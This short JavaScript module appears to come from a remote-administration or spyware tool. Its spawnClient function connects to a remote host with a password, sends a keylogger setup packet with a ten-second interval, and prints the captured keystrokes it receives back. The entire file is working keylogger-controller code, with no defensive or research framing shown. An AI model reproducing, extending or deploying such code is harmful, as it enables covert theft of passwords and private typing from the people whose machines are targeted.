const Client = require('../../../../src/Client')
const { Packets } = require('../../../../src/lib/Protocol')

function spawnClient (host, port, password) {


  console.log('Connecting to', host, port)
  var client = new Client()

  client.connect(
    port,
    host,
    password,
    function () {
      this.emit('connect')

      this._TCPclient.write(Packets.KeylogSetup.create({ interval: 10000 }))

      this.on(Packets.r_Keylog, function (packet) {
        console.log(
          'Received key strokes:',
          String.fromCharCode(...packet.data)
        )
      })
    }
  )

  return client
}

export { spawnClient }
